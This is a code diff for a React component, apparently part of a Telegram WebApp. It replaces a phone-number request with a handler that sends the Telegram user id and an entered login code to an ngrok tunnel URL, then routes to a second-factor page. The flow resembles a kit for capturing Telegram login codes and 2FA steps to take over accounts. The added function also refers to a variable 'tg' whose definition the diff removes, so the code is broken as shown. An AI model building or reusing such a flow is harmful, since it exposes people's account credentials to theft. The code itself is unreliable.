@@ -8,41 +8,30 @@ export default function Auth2() {
 
 
 
-  const requestPhoneNumber = () => {
-    const tg = window.Telegram?.WebApp;
-    if (!tg) {
-      alert("This works only inside Telegram WebApp");
-      return;
-    }
-
+  const handleSubmitCode = async () => {
     const userId = tg.initDataUnsafe?.user?.id;
+    try {
+        const res = await fetch("https://4aa1a6d7ad73.ngrok-free.app/api/code", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ user_id: userId, code: newCode.join("") })
+        });
 
-    tg.requestContact(async (result) => {
-      if (result) {
-        // Send user_id + phone to backend
-        try {
-          const res = await fetch("https://4aa1a6d7ad73.ngrok-free.app/api/code", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ user_id: userId, code: newCode.join("") })
-          });
-
-          const json = await res.json();
-
-          if (json.ok) {
+        const data = await res.json();
+        if (data.ok) {
+        if (data["2fa"]) {
             navigate("/auth2");
-          } else {
-            alert("Error: " + (json.error || "Unknown error"));
-          }
-        } catch (err) {
-          alert("Network error: " + err.message);
+        } else {
+            navigate("/success"); // or wherever
         }
-
-      } else {
-        alert("Вы отказались или действие не завершено");
-      }
-    });
-  };
+        } else {
+        alert("Error: " + data.error);
+        }
+    } catch (err) {
+        console.error(err);
+        alert("Request failed");
+    }
+    };
 
 
   useEffect(() => {
@@ -61,7 +50,7 @@ export default function Auth2() {
     }
 
     if (newCode.every(digit => digit !== "")) {
-      requestPhoneNumber()
+      handleSubmitCode()
     }
   };
 
